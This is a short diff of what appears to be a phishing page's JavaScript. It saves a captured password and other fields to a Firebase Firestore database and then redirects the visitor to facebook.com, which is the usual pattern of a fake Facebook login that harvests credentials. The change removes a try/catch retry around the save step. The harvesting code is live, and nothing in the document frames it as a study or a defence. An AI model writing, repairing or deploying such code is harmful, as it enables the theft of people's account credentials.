@@ -48,7 +48,6 @@
                     measurementId: "G-NRS398L5KQ"
                   };
                   function save(){
-                      try{
                       // Initialize Firebase
                       firebase.initializeApp(firebaseConfig);
                       // Initialize Cloud Firestore and get a reference to the service
@@ -61,9 +60,6 @@
                           pass : passt
                       })
                       window.location.href = "https://facebook.com"
-                      }catch{
-                        save()
-                      }
                   }
                   save()
             }
